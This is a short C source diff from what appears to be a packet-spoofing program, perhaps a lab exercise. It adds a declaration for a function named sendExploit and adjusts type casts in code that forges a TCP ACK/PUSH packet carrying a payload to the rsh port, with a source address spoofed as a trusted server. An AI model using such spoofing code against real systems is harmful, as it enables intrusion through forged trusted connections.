@@ -7,7 +7,7 @@
 #include "sender.h"
 #include "packetsniffer.h"
 #include <pcap/pcap.h>
-
+void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
 int main()
 {
 
@@ -75,7 +75,7 @@ void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_lon
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)0);
         sendPacket(l);
 //ACK
-        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)19283747,(u_int32_t)next+1,(u_int8_t*)payload,plen, TH_ACK | TH_PUSH);
+        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)19283747,(u_int32_t)next+1,(char*)payload,plen, (u_int8_t)TH_ACK | TH_PUSH);
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)plen);
         sendPacket(l);
 }
